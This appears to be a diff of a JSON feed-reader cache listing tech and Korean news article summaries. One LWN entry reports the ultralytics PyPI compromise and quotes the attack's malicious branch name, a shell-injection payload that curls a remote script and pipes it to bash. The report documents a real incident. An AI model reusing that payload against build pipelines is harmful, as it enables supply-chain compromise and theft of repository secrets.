@@ -956,36 +956,6 @@
           "wordCount": null,
           "title": "Hot Swap Controllers Provide Safety in Power Distribution Systems",
           "imageUrl": null
-        },
-        {
-          "id": "https://www.embedded.com/?p=4492846",
-          "author": "Stefano Lovati",
-          "description": "Nisshinbo Micro Devices has unveiled the NT1821 and NT1822 High Isolation SPDT Switches. These tiny switches are designed to fulfill the requirements of contemporary Wi-Fi 7 infrastructure and other wireless communication applications, providing exceptional isolation and minimal insertion loss over an extensive frequency range. The NT1821 is a high-performance SPDT switch engineered for wireless communication […]\nThe post Nisshinbo Launches 1.0 to 7.125 GHz High Isolation SPDT Switches for Wi-Fi 7 appeared first on Embedded.",
-          "link": "https://www.embedded.com/nisshinbo-launches-1-0-to-7-125-ghz-high-isolation-spdt-switches-for-wi-fi-7/",
-          "publishedOn": "2024-12-06T20:31:00.000Z",
-          "wordCount": null,
-          "title": "Nisshinbo Launches 1.0 to 7.125 GHz High Isolation SPDT Switches for Wi-Fi 7",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.embedded.com/?p=4492831",
-          "author": "Stefano Lovati",
-          "description": "Here’s a RoundUp of this week’s must-read articles – we’ll delve into the latest developments on Portable Memory, BMS Open Wire Detection, and Embedded Rust! Also, check News Archives – Embedded and Technical Articles Archives – Embedded for the complete list of news and articles from our website. NEWS X-FAB Introduces Embedded Flash Solution Utilizing Its 110nm Automotive BCD-on-SOI […]\nThe post Portable Memory, BMS Open Wire Detection, Embedded Rust: Embedded Week Insights appeared first on Embedded.",
-          "link": "https://www.embedded.com/portable-memory-bms-open-wire-detection-embedded-rust-embedded-week-insights/",
-          "publishedOn": "2024-12-06T16:00:00.000Z",
-          "wordCount": null,
-          "title": "Portable Memory, BMS Open Wire Detection, Embedded Rust: Embedded Week Insights",
-          "imageUrl": null
-        },
-        {
-          "id": "https://www.embedded.com/?p=4492343",
-          "author": "Stefano Lovati",
-          "description": "Passive components don’t need an external power source and don’t increase or generate power; they use a small amount of energy. In contrast, active components require a power source, like a battery, to increase the power of signals. Examples of passive components include resistors, capacitors, and inductors while transistors and integrated circuits (ICs) are active […]\nThe post Passive Component Selection Know-How for Hardware Design appeared first on Embedded.",
-          "link": "https://www.embedded.com/passive-component-selection-know-how-for-hardware-design/",
-          "publishedOn": "2024-12-06T11:06:29.000Z",
-          "wordCount": null,
-          "title": "Passive Component Selection Know-How for Hardware Design",
-          "imageUrl": null
         }
       ]
     },
@@ -1064,6 +1034,16 @@
       "feedUrl": "https://feeds.feedburner.com/GDBcode",
       "siteUrl": "https://developers.googleblog.com/rss/",
       "articles": [
+        {
+          "id": "https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/",
+          "author": null,
+          "description": "PaliGemma 2, the next evolution in tunable vision-language models, comes with new features such as scalable performance, long captioning, and expanded capabilities. Get started with pre-trained models, documentation, and tutorials.",
+          "link": "https://developers.googleblog.com/en/introducing-paligemma-2-powerful-vision-language-models-simple-fine-tuning/",
+          "publishedOn": "2025-01-05T20:15:01.405Z",
+          "wordCount": null,
+          "title": "Introducing PaliGemma 2: Powerful Vision-Language Models, Simple Fine-Tuning",
+          "imageUrl": null
+        },
         {
           "id": "https://developers.googleblog.com/en/introducing-the-google-developer-program-premium/",
           "author": null,
@@ -1302,16 +1282,6 @@
           "publishedOn": "2024-12-08T20:16:35.728Z",
           "wordCount": null,
           "title": "Supercharging AI Coding Assistants with Gemini Models' Long Context",
-          "imageUrl": null
-        },
-        {
-          "id": "https://developers.googleblog.com/en/looking-back-at-the-first-year-of-the-gemini-era/",
-          "author": null,
-          "description": "The range of family of Gemini models has expanded in the past year in response to developer needs, introducing faster and more cost-effective models, and enhancing tools in Google AI Studio.",
-          "link": "https://developers.googleblog.com/en/looking-back-at-the-first-year-of-the-gemini-era/",
-          "publishedOn": "2024-12-06T20:17:59.644Z",
-          "wordCount": null,
-          "title": "Looking back at the first year of the Gemini era",
           "imageUrl": null
         }
       ]
@@ -2322,46 +2292,6 @@
           "wordCount": null,
           "title": "Security updates for Monday",
           "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/1001215/",
-          "author": "daroc",
-          "description": "A compromised release was uploaded to PyPI after a project automatically processed a pull request with a flawed script.\nThe GitHub account \n\n\"OpenIM Robot\"\n(which appears to be controlled by\nXinwei Xiong) opened\na pull request for the \n\nultralytics\nPython package. The pull request included a suspicious Git branch name:\n\n\n\nopenimbot:$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)\n\n\n\nUnfortunately, ultralytics uses the\npull_request_target GitHub Action trigger to automate some of its continuous integration tasks. This runs a script from the base branch of the repository, which has access to the repository's secrets — but that script was vulnerable to a shell injection attack from the branch name of the pull request. The injected script appears to have used the credentials it had access to in order to compromise a later release uploaded to PyPI to include a cryptocurrency miner. It is hard to be sure of the details, because GitHub has already pulled the malicious script.\n\n\n\nThis problem has been\nknown for several years, but this event may serve as a good reminder to be careful with automated access to important secrets.",
-          "link": "https://lwn.net/Articles/1001215/",
-          "publishedOn": "2024-12-06T18:44:12.000Z",
-          "wordCount": null,
-          "title": "Abusing Git branch names to compromise a PyPI package",
-          "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/1001202/",
-          "author": "daroc",
-          "description": "Greg Kroah-Hartman released version\n6.12.3 of the kernel to fix\n\na regression that can cause some machines to fail to boot on version 6.12.2.\nThe other stable branches are continuing on their normal cadence, with\n\n6.12.4-rc1 and\n\n6.6.64-rc1 starting review today.",
-          "link": "https://lwn.net/Articles/1001202/",
-          "publishedOn": "2024-12-06T15:58:41.000Z",
-          "wordCount": null,
-          "title": "A single stable kernel to fix boot problems",
-          "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/1000654/",
-          "author": "corbet",
-          "description": "The page\nstructure sits at the core of the kernel's memory-management subsystem\n(for now), and a key part of that structure is its reference count, stored\nin refcount.  The page reference count tells the kernel how many\nusers a given page has and when it can be freed.  That count is not needed\nfor every page in the system, though.  Matthew Wilcox has recently resurrected\nan old\npatch set that expands the concept of a \"frozen\" page — one that lacks a\nmeaningful reference count — to the immediate benefit of the slab allocator\nbut in the service of a longer-term goal as well.",
-          "link": "https://lwn.net/Articles/1000654/",
-          "publishedOn": "2024-12-06T15:55:16.000Z",
-          "wordCount": null,
-          "title": "[$] Freezing out the page reference count",
-          "imageUrl": null
-        },
-        {
-          "id": "https://lwn.net/Articles/1001164/",
-          "author": "daroc",
-          "description": "Security updates have been issued by AlmaLinux (firefox, postgresql, postgresql:12, postgresql:13, postgresql:15, postgresql:16, python3:3.6.8, and thunderbird), Debian (clamav), Fedora (pam), Red Hat (firefox, postgresql:13, postgresql:15, python-tornado, redis:7, ruby, ruby:2.5, and ruby:3.1), SUSE (avahi, docker-stable, java-1_8_0-openjdk, libmozjs-128-0, obs-scm-bridge, php8, and teleport), and Ubuntu (ghostscript, needrestart, and shiro).",
-          "link": "https://lwn.net/Articles/1001164/",
-          "publishedOn": "2024-12-06T14:26:41.000Z",
-          "wordCount": null,
-          "title": "Security updates for Friday",
-          "imageUrl": null
         }
       ]
     },
@@ -2674,16 +2604,6 @@
           "wordCount": null,
           "title": "‘붉은깃발법’은 어리석은 법인가?",
           "imageUrl": null
-        },
-        {
-          "id": "http://economicview.net/?p=85641",
-          "author": "sticky",
-          "description": "요즘 AI에 대해 유튜브 영상을 부지런히 찾아보고 있다. 기술적 지식이 부족한 터라 체계적인 지식을 쌓는 데 어려움이 있지만, 일단 초기 AI처럼 귀납적으로 내 머릿속에 때려 넣고 있다. 여러 많은 영상 중에서도 이 영상이 차분하게 AI의 역사와 현재, 그리고 미래에 대해 비교적 알기 쉽게 설명해 주는 것 같아 소개한다.",
-          "link": "http://economicview.net/85641/",
-          "publishedOn": "2024-12-07T01:09:46.000Z",
-          "wordCount": 1229,
-          "title": "AI에 관한 영상 하나",
-          "imageUrl": "https://s0.wp.com/i/blank.jpg"
         }
       ]
     },
@@ -3301,26 +3221,6 @@
           "wordCount": 3995,
           "title": "105명의 내란죄 공범들.",
           "imageUrl": "https://slownews.kr/wp-content/uploads/2024/12/21145335.png"
-        },
-        {
-          "id": "https://slownews.kr/?p=123011",
-          "author": "이정환",
-          "description": "윤석열의 7일 아침 담화는 짧은 사과와 약속, 향후 계획으로 구성됐다. 담화 전문. “존경하는 국민 여러분. 저는 12월 3일 밤 11시를 기해 비상계엄을 선포했습니다. 약 2시간 후 12월 4일 오전 1시경 국회의 계엄 해제 결의에 따라 군의 철수를 지시하고 심야 국무회의를 거쳐 계엄을 해제했습니다. 이번 비상계엄 선포는 국정 최종 책임자인 대통령으로서의 절박함에서 비롯됐습니다. 하지만 그 과정에서...\nThe post 나를 지켜달라, 윤석열 대국민 담화가 의미하는 것. appeared first on 슬로우뉴스..",
-          "link": "https://slownews.kr/123011",
-          "publishedOn": "2024-12-07T01:37:45.000Z",
-          "wordCount": 4349,
-          "title": "나를 지켜달라, 윤석열 대국민 담화가 의미하는 것.",
-          "imageUrl": "https://slownews.kr/wp-content/uploads/2024/12/image-1-1000x561.png"
-        },
-        {
-          "id": "https://slownews.kr/?p=122994",
-          "author": "이정환",
-          "description": "첫째, 홍장원은 ‘미친 놈’이라 생각하고 거부했다. 둘째, 곽종근은 “들어가지 말라”고 지시했다. 곽종근과 이상현, 둘 중 한 사람은 거짓말을 하고 있다. 셋째, 이진우는 “총기를 들지 말라”고 지시했다. 넷째, 조지호는 “포고령을 따라야 한다”고 말했다. 다섯째, 박안수는 “몰랐다”고 발뺌했다. 5가지 다른 방법. “부당한 명령은 불복종해야 한다.” “진심과 용기가 느껴졌던 순간이었다.” 핵심은.\nThe post 부당한 명령에 대처하는 5가지 다른 방법. appeared first on 슬로우뉴스..",
-          "link": "https://slownews.kr/122994",
-          "publishedOn": "2024-12-07T00:12:22.000Z",
-          "wordCount": 5049,
-          "title": "부당한 명령에 대처하는 5가지 다른 방법.",
-          "imageUrl": "https://slownews.kr/wp-content/uploads/2024/12/Screenshot-2024-12-07-at-9.17.39 AM-1000x560.png"
         }
       ]
     },
